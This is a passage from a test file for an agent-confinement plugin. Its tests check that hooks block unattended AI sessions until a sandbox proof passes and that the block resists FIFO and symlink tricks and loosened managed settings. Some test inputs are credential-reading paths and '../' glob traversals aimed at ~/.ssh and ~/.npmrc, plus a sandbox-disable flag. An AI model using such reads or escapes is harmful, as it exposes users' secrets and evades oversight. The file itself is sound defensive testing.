  const at = attempt(t);
  plan(at);
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: true };
  assert.equal(hostVarsProblem(at.folder, { GOFLAGS: '-modcacherw' }), null, 'a value that names no cache folder');
  const exact = bash('aidrian project confine launch ENG-1', at.work);
  const denied = confineDenial(exact, { mark, env: { npm_config_cache: at.vars.npm_config_cache } });
  assert.match(denied.reason, /host process's own environment holds the cache variables npm_config_cache/u);
  const verdict = verdictAt(at);
  assert.deepEqual([verdict.pass, verdict.by, verdict.session], [false, 'hook', SESSION]);
  assert.match(confineDenial(exact, { mark, env: {} }).reason, /refuses every later call/u);
  assert.match(confineCheck({ folder: at.folder, session: SESSION }).problem, /host process's own environment/u);
});

test('the agent gate hook, run as the host runs it, refuses a marked session every call but the confine command', (t) => {
  const at = attempt(t);
  plan(at);
  assert.ok(markUnattended(SESSION, { root: at.root, cwd: at.work, env: at.env, tags: { project: 'launch', issue: 'ENG-1', confine: true } }));
  assert.equal(readUnattendedMark(SESSION, { env: at.env, home: at.home }).confine, true);
  const hook = (input) => spawnSync(process.execPath, [HOOK], { input: JSON.stringify(input), encoding: 'utf8', env: { ...process.env, ...at.env, AIDRIAN_TELEMETRY: '0' } });
  const read = hook({ session_id: SESSION, tool_name: 'Read', tool_input: { file_path: path.join(at.work, 'README.md') }, cwd: at.work });
  assert.equal(read.status, 2, read.stderr);
  assert.match(read.stderr, /aidrian project confine launch ENG-1/u);
  assert.equal(hook(bash('aidrian project confine launch ENG-1', at.work)).status, 0);
  assert.ok(markUnattended(SESSION, { root: at.root, cwd: at.work, env: at.env, tags: { project: 'launch', issue: 'ENG-1', confine: 'failed' } }));
  assert.equal(hook(bash('aidrian project confine launch ENG-1', at.work)).status, 2);
  assert.equal(markUnattended('other-session', { root: at.root, cwd: at.work, env: at.env, tags: { project: 'launch', issue: 'ENG-1', confine: 'yes' } }), null, 'a tag of another shape');
});

test('a FIFO or a link at a hook`s counter neither stalls a refusal past the hook`s time nor leads its write elsewhere', { skip: process.platform === 'win32' }, (t) => {
  const at = attempt(t);
  plan(at);
  assert.ok(markUnattended(SESSION, { root: at.root, cwd: at.work, env: at.env, tags: { project: 'launch', issue: 'ENG-1', confine: true } }));
  const temp = path.join(at.root, 'hooktmp');
  mkdirSync(temp);
  const refuse = () => {
    const started = Date.now();
    const result = spawnSync(process.execPath, [HOOK], {
      input: JSON.stringify({ session_id: SESSION, tool_name: 'Write', tool_input: { file_path: path.join(at.home, '.zshrc'), content: 'x' }, cwd: at.work }),
      encoding: 'utf8', timeout: 8000, env: { ...process.env, ...at.env, TMPDIR: temp, AIDRIAN_TELEMETRY: '0' },
    });
    return { status: result.status, ms: Date.now() - started };
  };
  const counts = path.join(at.env.XDG_STATE_HOME, 'aidrian', 'hook-counts', `aidrian-denials-${SESSION}`);
  assert.equal(refuse().status, 2);
  // One count per rule, agent run, and cause (lib/lesson-signals.mjs denialCount): `config-guard.main.<digest>`.
  const name = (existsSync(counts) ? readdirSync(counts) : []).find((each) => /^config-guard\.main\.[0-9a-f]{16}$/u.test(each));
  assert.ok(name, 'the count lies in the state root');
  const count = path.join(counts, name);
  assert.equal(existsSync(path.join(temp, `aidrian-denials-${SESSION}`)), false, 'and not in the temporary folder a sandbox may write');
  // A FIFO at the count and at the old temporary path: the refusal still exits 2, well inside the host's 5 seconds.
  for (const fifo of [count, path.join(temp, `aidrian-denials-${SESSION}`, name)]) {
    rmSync(fifo, { force: true });
    mkdirSync(path.dirname(fifo), { recursive: true });
    execFileSync('mkfifo', [fifo]);
  }
  const fifoRun = refuse();
  assert.deepEqual([fifoRun.status, fifoRun.ms < 4000], [2, true], `${fifoRun.ms} ms`);
  // A link at the count: the write never lands at its target.
  const target = path.join(at.home, '.zshrc');
  writeFileSync(target, 'kept\n');
  rmSync(count);
  symlinkSync(target, count);
  assert.equal(refuse().status, 2);
  assert.equal(readFileSync(target, 'utf8'), 'kept\n');
  // So for a subagent's send-back count, read and stored.
  const agent = { agent_id: 'a1', stop_hook_active: true };
  const folder = path.join(at.root, 'counts');
  mkdirSync(folder);
  execFileSync('mkfifo', [path.join(folder, 'aidrian-child-send-backs-a1')]);
  const script = `import { childSendBacks, storeChildSendBacks } from ${JSON.stringify(path.resolve(import.meta.dirname, '../plugins/aidrian/lib/child-send-backs.mjs'))};
    process.stdout.write(JSON.stringify([childSendBacks(${JSON.stringify(agent)}, { dir: ${JSON.stringify(folder)} }), storeChildSendBacks(${JSON.stringify(agent)}, 2, { dir: ${JSON.stringify(folder)} })]));`;
  const child = spawnSync(process.execPath, ['--input-type=module', '-e', script], { encoding: 'utf8', timeout: 8000 });
  assert.equal(child.signal, null, 'never waits on the FIFO');
  assert.deepEqual(JSON.parse(child.stdout), [5, false]);
  rmSync(path.join(folder, 'aidrian-child-send-backs-a1'));
  symlinkSync(target, path.join(folder, 'aidrian-child-send-backs-a1'));
  assert.deepEqual([childSendBacks(agent, { dir: folder }), storeChildSendBacks(agent, 2, { dir: folder })], [5, false]);
  assert.equal(readFileSync(target, 'utf8'), 'kept\n');
  rmSync(path.join(folder, 'aidrian-child-send-backs-a1'));
  assert.deepEqual([storeChildSendBacks(agent, 2, { dir: folder }), childSendBacks(agent, { dir: folder })], [true, 2]);
});

test('`aidrian project confine` runs only in its issue`s clone, and its hook rule admits only that issue`s session', async (t) => {
  const answer = await projectCommand(['confine', 'launch', 'ENG-1'], { cwd: tmpdir(), env: {} });
  assert.equal(answer.exitCode, 1);
  assert.match(answer.err.join('\n'), /not a clone of the run launch's issue ENG-1/u);
  const fx = runFixture(t);
  const started = fx.cmd(['start', 'launch', 'ENG-1']);
  assert.equal(started.exitCode, 0, started.err.join('\n'));
  const work = path.join(realpathSync(fx.state), 'runs', 'launch', 'attempts', 'ENG-1.1', 'work');
  const confine = (session, cwd = work) => projectCommandDenial(bash('aidrian project confine launch ENG-1', cwd, session), NAMES, { home: fx.home });
  assert.equal(confine(STARTED[0].session), null);
  assert.match(confine(OTHER)?.reason ?? '', /not that one/u);
  // Before the gate files its own mark, a session the pending mark starts in that clone runs it; from elsewhere it does not.
  assert.ok(markPending('pending-driver', { cwd: work, root: fx.dir, known: [], env: fx.env }));
  assert.equal(confine('unlisted-new-1'), null);
  assert.match(confine('unlisted-new-1', fx.dir)?.reason ?? '', /not that one/u);
  // A folder in the clone that is there runs it; one that is not there, or one beside the clone that a link in it
  // reaches, as its drop folder, does not.
  assert.equal(confine('unlisted-new-1', path.join(work, '.claude')), null);
  symlinkSync(path.join(path.dirname(work), 'drop'), path.join(work, 'beside'));
  for (const cwd of [path.join(work, 'missing'), path.join(work, 'beside'), path.join(work, 'gone', 'deeper')]) {
    assert.match(confine('unlisted-new-1', cwd)?.reason ?? '', /not that one/u, cwd);
  }
});

test('a start writes the plan, holds the session once its proof passed, and files the pass in its mark; the listener stops', async (t) => {
  const fx = runFixture(t);
  const result = fx.cmd(['start', 'launch', 'ENG-1']);
  assert.equal(result.exitCode, 0, result.err.join('\n'));
  const folder = path.join(realpathSync(fx.state), 'runs', 'launch', 'attempts', 'ENG-1.1');
  const made = readSmallJson(path.join(folder, CONFINE_PLAN));
  assert.deepEqual([made.run, made.key, made.attempt, made.unlisted.host, made.local.host], ['launch', 'ENG-1', 1, 'example.com', '127.0.0.1']);
  assert.ok(made.marks.length >= 1);
  assert.match(fx.claude.starts()[0].args.at(-1), /run exactly `aidrian project confine launch ENG-1`/u);
  assert.equal(readUnattendedMark(STARTED[0].session, { env: fx.env, home: fx.home }).confine, 'passed');
  const { pid } = made.local;
  const alive = () => {
    try {
      process.kill(pid, 0);
      return true;
    } catch {
      return false;
    }
  };
  // The start's process reaps the stopped listener once its event loop runs again.
  for (let tries = 0; tries < 50 && alive(); tries += 1) await new Promise((resolve) => setTimeout(resolve, 100));
  assert.equal(alive(), false, 'the listener is stopped once the start ends');
});

test('a start whose proof failed, or never came, stops the session, files the failure in its mark, and halts the run', (t) => {
  for (const [confine, cause] of [
    [(made, session) => ({ ...passVerdict(made, session), pass: false, failed: ['write /user-home/x'] }), /failed its proof: the session's sandbox proof failed: write \/user-home\/x/u],
    [null, /did not prove its sandbox with `aidrian project confine` within 180 seconds/u],
    [(made, session) => ({ ...passVerdict(made, session), nonce: 'f'.repeat(16) }), /not this start's/u],
  ]) {
    const fx = runFixture(t);
    const claude = fakeClaude({ dir: fx.dir, env: fx.env, confine });
    const result = fx.cmd(['start', 'launch', 'ENG-1'], { spawn: claude.run });
    assert.equal(result.exitCode, 1);
    assert.match(result.out.find((line) => line.startsWith('halt ')) ?? '', cause);
    const rows = fx.rows();
    assert.deepEqual([rows.at(-3).outcome, rows.at(-3).proof, rows.at(-1).event], ['void', true, 'halt']);
    assert.deepEqual(claude.calls.filter((call) => call.args[0] === 'stop').map((call) => call.args[1]), [STARTED[0].id]);
    assert.equal(readUnattendedMark(STARTED[0].session, { env: fx.env, home: fx.home }).confine, 'failed');
  }
});

test('a failed proof whose session could not be stopped still halts the run, and leaves the start for wait to settle', (t) => {
  const fx = runFixture(t);
  const claude = fakeClaude({ dir: fx.dir, env: fx.env, stoppable: false, confine: (made, session) => ({ ...passVerdict(made, session), pass: false, failed: ['write /x'] }) });
  const result = fx.cmd(['start', 'launch', 'ENG-1'], { spawn: claude.run });
  assert.equal(result.exitCode, 1);
  assert.match(result.out[0], /^halt the start of ENG-1 attempt 1 failed its proof: the session's sandbox proof failed: write \/x, and the session .* could not be stopped/u);
  const rows = fx.rows();
  assert.deepEqual([rows.at(-2).event, rows.at(-2).outcome, rows.at(-2).proof, rows.at(-1).event], ['start', 'uncertain', true, 'halt']);
  assert.match(fx.cmd(['start', 'launch', 'ENG-1']).out[0], /^halt the run is halted/u);
});

test('a start whose session`s SessionStart hook never ran gives its attempt back and exits 75, with no halt row', (t) => {
  const fx = runFixture(t);
  // The session runs its first call, the beacon comes, and the hook never records a handoff: confine only retries.
  const claude = fakeClaude({ dir: fx.dir, env: fx.env, confine: null, handoff: false });
  const result = fx.cmd(['start', 'launch', 'ENG-1'], { spawn: claude.run });
  assert.equal(result.exitCode, 75, [...result.out, ...result.err].join('\n'));
  assert.match(result.out.find((line) => line.startsWith('retry: ')) ?? '', /^retry: the start of ENG-1 attempt 1 gave its attempt back: the host ran the session's first tool call before its SessionStart hook, which never ran, so its sandbox proof never ran \(.*within 180 seconds/u);
  const rows = fx.rows();
  assert.deepEqual(rows.filter((row) => row.event === 'halt'), [], 'no halt row');
  assert.deepEqual([rows.at(-2).event, rows.at(-2).outcome, rows.at(-2).proof, rows.at(-2).raced, rows.at(-1).event, rows.at(-1).state], ['start', 'void', true, true, 'issue', 'open']);
  assert.deepEqual(claude.calls.filter((call) => call.args[0] === 'stop').map((call) => call.args[1]), [STARTED[0].id], 'the session was stopped');
  assert.equal(readUnattendedMark(STARTED[0].session, { env: fx.env, home: fx.home }).confine, 'failed');
  assert.doesNotMatch(fx.cmd(['next', 'launch']).out[0] ?? '', /^halted/u);
  // Each such start keeps its attempt number and counts toward the caps, so a host that never runs the hook stops at the
  // issue's cap, unhalted.
  for (const tries of [2, 3]) {
    const again = fx.cmd(['start', 'launch', 'ENG-1'], { spawn: claude.run });
    assert.equal(again.exitCode, 75, `start ${tries}`);
    assert.match(again.out.find((line) => line.startsWith('retry: ')) ?? '', new RegExp(`attempt ${tries} gave its attempt back`, 'u'));
  }
  const capped = fx.cmd(['start', 'launch', 'ENG-1'], { spawn: claude.run });
  assert.equal(capped.exitCode, 1);
  assert.match(capped.err.join('\n'), /the issue ENG-1 was started 3 times, and an issue is started at most 3/u);
  assert.deepEqual(fx.rows().filter((row) => row.event === 'halt'), [], 'still no halt row');
});

test('a start whose proof cannot be prepared refuses, leaves no attempt folder, and records nothing', (t) => {
  const cap = claudeCode.capabilities.projectStart;
  const kept = cap.confineDomains;
  cap.confineDomains = () => ['*'];
  t.after(() => {
    cap.confineDomains = kept;
  });
  const fx = runFixture(t);
  const before = fx.rows().length;
  const result = fx.cmd(['start', 'launch', 'ENG-1']);
  assert.equal(result.exitCode, 1);
  assert.match(result.err.join('\n'), /the sandbox proof cannot be prepared: every host the proof names as unlisted/u);
  assert.equal(existsSync(path.join(fx.state, 'runs', 'launch', 'attempts', 'ENG-1.1')), false);
  assert.equal(fx.rows().length, before);
  assert.deepEqual(fx.claude.starts(), []);
});

test('a passed proof the start cannot file in the session`s mark holds no session', { skip: process.getuid?.() === 0 }, (t) => {
  const fx = runFixture(t);
  const claude = fakeClaude({ dir: fx.dir, env: fx.env, confine: null });
  const folder = markFolder(fx.env);
  let handed = false;
  // Once the session's mark is filed, the proof passes, and the mark folder takes no more writes.
  const wait = () => {
    if (handed || !existsSync(path.join(folder, `${STARTED[0].session}.json`))) return;
    handed = true;
    const work = path.join(realpathSync(fx.state), 'runs', 'launch', 'attempts', 'ENG-1.1', 'work');
    const made = readSmallJson(path.join(path.dirname(work), CONFINE_PLAN));
    writeFileSync(path.join(path.dirname(work), 'drop', CONFINE_VERDICT), JSON.stringify(passVerdict(made, STARTED[0].session)));
    // As the session's SessionStart hook records it, having handed the forge token over.
    writeHandoff(path.dirname(work), { handed: true });
    chmodSync(folder, 0o500);
  };
  let result;
  try {
    result = fx.cmd(['start', 'launch', 'ENG-1'], { spawn: claude.run, wait });
  } finally {
    chmodSync(folder, 0o700);
  }
  assert.equal(handed, true);
  assert.equal(result.exitCode, 1);
  assert.match(result.out[0], /could not file the passed proof in the session's mark/u);
});

test('the listener the start runs that never names its port is stopped, and the start refuses', () => {
  const killed = [];
  const fake = () => ({ pid: 2_000_000_000, on() {}, unref() {} });
  const realKill = process.kill;
  process.kill = (pid) => killed.push(pid);
  try {
    const answer = startListener(realpathSync(tmpdir()), { run: fake, pause: () => {} });
    assert.match(answer.problem, new RegExp(`did not start within ${LISTENER_START / 1000} seconds`, 'u'));
  } finally {
    process.kill = realKill;
  }
  assert.deepEqual(killed, [2_000_000_000]);
});

test('the organization`s managed settings, which rank above --settings, are judged as the user`s, with its scalars held to the session`s', (t) => {
  const fx = runFixture(t, { init: false });
  const dir = path.join(fx.root, 'managed');
  const drops = path.join(dir, 'managed-settings.d');
  mkdirSync(drops, { recursive: true });
  const guarded = [path.join(fx.home, '.local', 'state'), fx.state];
  const ask = (value, file = path.join(dir, 'managed-settings.json')) => {
    rmSync(dir, { recursive: true, force: true });
    mkdirSync(drops, { recursive: true });
    if (value !== undefined) writeFileSync(file, typeof value === 'string' ? value : JSON.stringify(value));
    return accessProblem({ env: fx.env, home: fx.home, guarded, pushUrl: 'https://github.com/acme/widgets.git', platform: 'linux', managed: { dir, plists: [] } });
  };
  assert.equal(ask(undefined), null);
  assert.equal(ask({ sandbox: { enabled: true, allowUnsandboxedCommands: false, network: { allowedDomains: ['internal.example'], allowLocalBinding: false }, filesystem: { denyRead: ['~/x'] } } }), null, 'at the session`s values, and narrowing lists');
  assert.match(ask({ sandbox: { allowUnsandboxedCommands: true } }), /managed settings .*managed-settings\.json set sandbox\.allowUnsandboxedCommands/u);
  assert.match(ask({ sandbox: { network: { allowLocalBinding: true } } }), /set sandbox\.network\.allowLocalBinding/u);
  assert.match(ask({ sandbox: { filesystem: { allowWrite: ['~/'] } } }), /set sandbox\.filesystem\.allowWrite/u);
  assert.match(ask({ hooks: { PreToolUse: [] } }), /managed-settings\.json set hooks/u);
  assert.match(ask({ permissions: { additionalDirectories: [fx.state] } }), /managed settings .* grant .* which reaches/u);
  assert.match(ask({ sandbox: { enabled: false } }, path.join(drops, '20-sandbox.json')), /managed-settings\.d\/20-sandbox\.json set sandbox\.enabled/u, 'a drop-in file');
  assert.equal(ask({ sandbox: { enabled: false } }, path.join(drops, '.hidden.json')), null, 'a hidden file the host ignores');
  assert.match(ask('not json'), /cannot be read: it is not JSON/u);
  assert.match(ask({ enabledPlugins: { 'other@market': true } }), /the plugin other@market is enabled/u, 'a plugin the organization turns on');
  assert.match(ask({ enabledPlugins: { [OWN_PLUGIN]: false } }), /this plugin is not enabled/u, 'and this one it turns off');
  // A drop-in folder that is there and cannot be listed, a platform with no documented sources, and a macOS profile.
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(dir);
  writeFileSync(drops, '');
  assert.match(managedSettings({ platform: 'linux', managed: { dir, plists: [] } }).problem, /cannot be listed/u);
  assert.match(managedSettings({ platform: 'win32' }).problem, /on win32 are not ones the start can read/u);
  const plist = path.join(fx.root, 'com.anthropic.claudecode.plist');
  writeFileSync(plist, 'binary');
  const plutil = (stdout, status = 0) => () => ({ status, stdout });
  rmSync(drops);
  assert.deepEqual(managedSettings({ platform: 'darwin', managed: { dir, plists: [plist] }, run: plutil('{"sandbox":{"enabled":false}}') }).documents, [{ source: plist, value: { sandbox: { enabled: false } } }]);
  assert.match(managedSettings({ platform: 'darwin', managed: { dir, plists: [plist] }, run: plutil('', 1) }).problem, /plutil cannot convert it to JSON/u);
  assert.deepEqual(managedSettings({ platform: 'darwin', managed: { dir, plists: [path.join(fx.root, 'none.plist')] } }).documents, []);
  assert.deepEqual(readdirSync(dir), []);
});

// Fix pass 2.

test('a file-tool read through `~`, or a relative Glob that climbs out of the clone, reaches the store it names', (t) => {
  const at = attempt(t);
  plan(at);
  const saved = process.env.HOME;
  process.env.HOME = at.home;
  t.after(() => (saved === undefined ? delete process.env.HOME : (process.env.HOME = saved)));
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: 'passed' };
  const call = (tool, input) => confineDenial({ session_id: SESSION, tool_name: tool, tool_input: input, cwd: at.work }, { mark, env: {} });
  for (const [tool, input] of [['Read', { file_path: '~/.ssh/id_test' }], ['Read', { file_path: '~/.npmrc' }], ['Grep', { pattern: 'x', path: '~' }],
    ['Glob', { pattern: '~/.ssh/*' }], ['Glob', { pattern: '../../../../../../home/.ssh/*' }], ['Glob', { pattern: '.s*/*', path: '../../../../../../home' }], ['Glob', { pattern: '../../../../../../home/.ss*' }]]) {
    assert.match(call(tool, input)?.reason ?? '', /hides/u, `${tool} ${JSON.stringify(input)}`);
  }
  assert.equal(call('Glob', { pattern: 'src/**/*.mjs' }), null);
  assert.equal(call('Read', { file_path: '~notes' }), null, 'a `~` that is not the first part');
  // A `..` past the pattern's literal folder climbs from wherever a glob matched: no folder bounds it, so it is refused.
  for (const pattern of ['src/**/../../../../../../../home/.ssh/*', '*/../../../../../../home/.ssh/*', 'src/*/..', 'src/{a,..}/*', `${at.work}/**/../x`]) {
    assert.match(call('Glob', { pattern })?.reason ?? '', /hides/u, pattern);
  }
  assert.deepEqual(fileReadOf({ tool_name: 'Glob', tool_input: { pattern: 'src/**/../x', path: '/c' } }), ['/c', '/c/src/', '/']);
  // A `..` in the literal folder is that folder, and a name that only holds two dots is no `..` segment.
  assert.equal(call('Glob', { pattern: '../work/src/*.mjs' }), null);
  assert.equal(call('Glob', { pattern: 'src/**/a..b.mjs' }), null);
});

test('a read probe sorts a folder`s entries before it caps them, so the fingerprint entry is always among them', async (t) => {
  const at = attempt(t);
  // More entries than a read reports, the first by name planted last.
  for (let i = 0; i < 700; i += 1) writeFileSync(path.join(at.keys, `k${String(i).padStart(4, '0')}`), '');
  writeFileSync(path.join(at.keys, 'a-first'), '');
  const made = plan(at, { reads: [at.keys] });
  offline(at, made);
  await runConfine({ run: 'launch', key: 'ENG-1', cwd: at.work, env: at.vars });
  writeVerdict(at, { ...passVerdict(made.plan, SESSION), reads: verdictAt(at).reads });
  assert.match(confineCheck({ folder: at.folder, session: SESSION, prints: made.prints }).problem, /^read .*\.ssh/u);
});

test('the hook`s sandbox escape reads any value but absent, false, or null as asked, and the confine command may end its line', () => {
  const map = (value) => claudeCode.hookInput({ tool_name: 'Bash', tool_input: { command: 'ls', dangerouslyDisableSandbox: value } }).sandbox_escape;
  for (const value of [true, 'true', 'false', 1, 0, '', {}, []]) assert.equal(map(value), true, JSON.stringify(value));
  for (const value of [false, null, undefined]) assert.equal(map(value), undefined, String(value));
  const attemptOf = { run: 'launch', key: 'ENG-1' };
  assert.equal(isConfineCall(bash('aidrian project confine launch ENG-1\n', '/'), attemptOf), true);
  assert.equal(isConfineCall(bash('aidrian project confine launch ENG-1\n\n', '/'), attemptOf), false);
  assert.equal(isConfineCall(bash('aidrian project confine launch ENG-1\n;x', '/'), attemptOf), false);
});

test('a failed proof`s verdict keeps no reads once the start filed the failure', (t) => {
  const fx = runFixture(t);
  const claude = fakeClaude({ dir: fx.dir, env: fx.env, confine: (made, session) => ({ ...passVerdict(made, session), pass: false, failed: ['write /x'], reads: [{ target: '/x', seen: ['a'.repeat(64)] }] }) });
  assert.equal(fx.cmd(['start', 'launch', 'ENG-1'], { spawn: claude.run }).exitCode, 1);
  const verdict = readSmallJson(path.join(realpathSync(fx.state), 'runs', 'launch', 'attempts', 'ENG-1.1', 'drop', CONFINE_VERDICT));
  assert.deepEqual([verdict.pass, verdict.reads, verdict.failed], [false, undefined, ['write /x']]);
});

test('the start reads its listener`s state from /proc on Linux and from /bin/ps elsewhere, and refuses when it can read neither', (t) => {
  const root = realpathSync(mkdtempSync(path.join(tmpdir(), 'aidrian-watch-')));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const proc = path.join(root, 'proc');
  mkdirSync(path.join(proc, '4242'), { recursive: true });
  const linux = { platform: 'linux', proc, ps: '/none', run: () => assert.fail('no ps on Linux') };
  assert.match(watchProblem(linux), /self\/stat cannot be read/u);
  mkdirSync(path.join(proc, 'self'));
  writeFileSync(path.join(proc, 'self', 'stat'), '1 (node) S 0');
  assert.equal(watchProblem(linux), null);
  writeFileSync(path.join(proc, '4242', 'stat'), '4242 (node -e (x)) Z 1 4242');
  assert.equal(alive(4242, linux), false, 'a zombie');
  writeFileSync(path.join(proc, '4242', 'stat'), '4242 (node -e (x)) S 1 4242');
  assert.equal(alive(4242, linux), true);
  assert.equal(alive(4343, linux), false, 'no such process');
  const other = { platform: 'darwin', proc, ps: path.join(root, 'no-ps'), run: () => ({ status: 0, stdout: 'S\n' }) };
  assert.match(watchProblem(other), /no-ps is not there/u);
  const at = attempt(t);
  const refused = prepareConfine({ folder: at.folder, run: 'launch', key: 'ENG-1', attempt: 1, work: at.work, git: at.git, drop: at.drop, cache: at.cache, domains: GITHUB, env: at.env, home: at.home, listen: fakeListen, watch: other });
  assert.match(refused.problem, /no-ps is not there, so the start cannot tell whether the sandbox proof's localhost listener lives/u);
  assert.equal(existsSync(path.join(at.folder, CONFINE_PLAN)), false);
});

test('the organization`s rule that only managed permission rules count halts a start, and the per-user profile is read', (t) => {
  const fx = runFixture(t, { init: false });
  const dir = path.join(fx.root, 'managed');
  mkdirSync(dir);
  writeFileSync(path.join(dir, 'managed-settings.json'), JSON.stringify({ allowManagedPermissionRulesOnly: true }));
  const problem = accessProblem({ env: fx.env, home: fx.home, guarded: [], pushUrl: 'https://github.com/acme/widgets.git', platform: 'linux', managed: { dir, plists: [] } });
  assert.match(problem, /allowManagedPermissionRulesOnly/u);
  assert.deepEqual(managedPlists('alice'), ['/Library/Managed Preferences/com.anthropic.claudecode.plist', '/Library/Managed Preferences/alice/com.anthropic.claudecode.plist']);
});

test('a JSON read under a folder a session may write never waits on a FIFO swapped in for the file', { skip: process.platform === 'win32' }, async (t) => {
  // The helper that swaps the files spins until it is stopped: the body stops it and waits for its exit before it
  // returns, and a hook registered before the removal does so too when the body throws first, so no removal races it.
  let toggler = null;
  const stopToggler = async () => {
    if (toggler === null || toggler.exitCode !== null || toggler.signalCode !== null) return;
    const exited = new Promise((resolve) => toggler.once('exit', resolve));
    toggler.kill('SIGKILL');
    await exited;
  };
  t.after(stopToggler);
  const root = realpathSync(mkdtempSync(path.join(tmpdir(), 'aidrian-race-')));
  t.after(() => rmSync(root, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 }));
  mkdirSync(path.join(root, '.aidrian'));
  const config = path.join(root, '.aidrian', 'config.json');
  const plain = path.join(root, '.aidrian', 'a.json');
  const fifo = path.join(root, '.aidrian', 'b.fifo');
  writeFileSync(plain, '{}');
  execFileSync('mkfifo', [fifo]);
  // A FIFO at the path: the read answers at once.
  const once = (file) => spawnSync(process.execPath, ['--input-type=module', '-e', `import { readJson } from ${JSON.stringify(FS_LIB)}; const errors = []; readJson(${JSON.stringify(root)}, ${JSON.stringify(file)}, errors); process.stdout.write(JSON.stringify(errors));`], { encoding: 'utf8', timeout: 3000 });
  const direct = once('.aidrian/b.fifo');
  assert.equal(direct.signal, null);
  assert.deepEqual(JSON.parse(direct.stdout), ['.aidrian/b.fifo: not found']);
  // A file and a FIFO swapped at the path while it is read, as a session may: no read waits.
  // Its own deadline, past the reads' 8 runs of at most 4 seconds, so it never spins alone.
  const end = String(Date.now() + 60_000);
  toggler = spawn(process.execPath, ['-e', `const fs = require('node:fs'); const [cfg, file, fifo, end] = process.argv.slice(1);
    for (;;) { if (Date.now() > Number(end)) process.exit(); try { fs.renameSync(file, cfg); fs.renameSync(cfg, file); fs.renameSync(fifo, cfg); fs.renameSync(cfg, fifo); } catch {} }`, config, plain, fifo, end], { stdio: 'ignore' });
  let hung = 0;
  try {
    for (let run = 0; run < 8; run += 1) {
      const reads = spawnSync(process.execPath, ['--input-type=module', '-e', `import { readJson } from ${JSON.stringify(FS_LIB)}; for (let k = 0; k < 2000; k += 1) readJson(${JSON.stringify(root)}, '.aidrian/config.json', []);`], { timeout: 4000 });
      if (reads.signal) hung += 1;
    }
  } finally {
    await stopToggler();
  }
  assert.equal(hung, 0);
});

test('the session-length and tracker-refusal markers live in the counts folder, and a FIFO or a link there stalls and leads nothing', { skip: process.platform === 'win32' }, (t) => {
  const root = realpathSync(mkdtempSync(path.join(tmpdir(), 'aidrian-markers-')));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const env = { XDG_STATE_HOME: path.join(root, 'state') };
  const counts = path.join(env.XDG_STATE_HOME, 'aidrian', 'hook-counts');
  assert.equal(sessionLengthMarker('s-1', { env }), path.join(counts, 'aidrian-session-length-s-1'));
  assert.equal(refusalMarker('s-1', { env }), path.join(counts, 'aidrian-tracker-refused-s-1'));
  mkdirSync(counts, { recursive: true });
  const target = path.join(root, 'target');
  writeFileSync(target, 'kept\n');
  for (const marker of [sessionLengthMarker('s-1', { env }), refusalMarker('s-1', { env })]) {
    execFileSync('mkfifo', [marker]);
    assert.equal(readOwnText(marker), null, 'a FIFO reads as none, at once');
    assert.equal(writeOwnText(marker, 'x'), false);
    rmSync(marker);
    symlinkSync(target, marker);
    assert.equal(readOwnText(marker), null, 'a link reads as none');
    assert.equal(writeOwnText(marker, 'x'), false, 'and is never written through');
    assert.equal(writeOwnText(marker, 'x', { exclusive: true }), false);
    rmSync(marker);
  }
  assert.equal(readFileSync(target, 'utf8'), 'kept\n');
  // The session's end, with a FIFO at the refusal marker, ends in time.
  execFileSync('mkfifo', [refusalMarker('s-1', { env })]);
  const end = spawnSync(process.execPath, [path.resolve(import.meta.dirname, '../plugins/aidrian/scripts/hook-session-end.mjs')], {
    input: JSON.stringify({ session_id: 's-1', cwd: root }), encoding: 'utf8', timeout: 8000, env: { ...process.env, ...env, TMPDIR: root },
  });
  assert.equal(end.signal, null, 'never waits on the FIFO');
  assert.equal(existsSync(refusalMarker('s-1', { env })), false, 'and removes it');
});

test('the counts folder sweeps entries a session that never ended left, past their age', (t) => {
  const root = realpathSync(mkdtempSync(path.join(tmpdir(), 'aidrian-sweep-')));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const old = path.join(root, 'aidrian-denials-gone');
  mkdirSync(old);
  writeFileSync(path.join(old, 'config-guard'), '...');
  const stale = Date.now() / 1000 - (HOOK_COUNTS_AGE / 1000 + 3600);
  utimesSync(old, stale, stale);
  writeFileSync(path.join(root, 'aidrian-session-length-now'), '{}');
  sweepHookCounts({ dir: root });
  assert.deepEqual(readdirSync(root), ['aidrian-session-length-now']);
});

test('the host`s read tools are pinned: a read tool the host adds fails this until the read refusal covers it', () => {
  assert.deepEqual([...READ_TOOLS], ['Read', 'Grep', 'Glob', 'NotebookRead', 'LS']);
  assert.deepEqual(claudeCode.fileReadTools, READ_TOOLS);
});

test('a file-tool read through `~/..`, with the home folder a link, climbs from the link`s target to the store it names', (t) => {
  const at = attempt(t);
  plan(at);
  // The home folder is a link to a folder inside the real one: `~/..` climbs from the link's target, where the stores are.
  const inner = path.join(at.home, 'inner');
  mkdirSync(inner);
  const linked = path.join(at.root, 'home-link');
  symlinkSync(inner, linked);
  const saved = process.env.HOME;
  process.env.HOME = linked;
  t.after(() => (saved === undefined ? delete process.env.HOME : (process.env.HOME = saved)));
  assert.deepEqual(fileReadOf({ tool_name: 'Read', tool_input: { file_path: '~/../x' } }), [`${linked}/../x`], 'expanded as text, not folded');
  assert.deepEqual(fileReadOf({ tool_name: 'LS', tool_input: { path: '~' } }), [linked]);
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: 'passed' };
  const call = (tool, input) => confineDenial({ session_id: SESSION, tool_name: tool, tool_input: input, cwd: at.work }, { mark, env: {} });
  for (const [tool, input] of [['Read', { file_path: '~/../.ssh/id_test' }], ['Read', { file_path: '~/../.npmrc' }], ['Grep', { pattern: 'x', path: '~/../.ssh' }],
    ['Glob', { pattern: '~/../.ssh/*' }], ['Glob', { pattern: '*', path: '~/../.ssh' }], ['LS', { path: '~/../.ssh' }]]) {
    assert.match(call(tool, input)?.reason ?? '', /hides/u, `${tool} ${JSON.stringify(input)}`);
  }
  assert.equal(call('Read', { file_path: '~/notes.md' }), null, 'a file in the linked home folder, no store');
});

test('a file-tool read of a store by another name for the same file or folder reaches that store', (t) => {
  const at = attempt(t);
  plan(at);
  const mark = { root: at.root, cwd: at.work, project: 'launch', issue: 'ENG-1', confine: 'passed' };
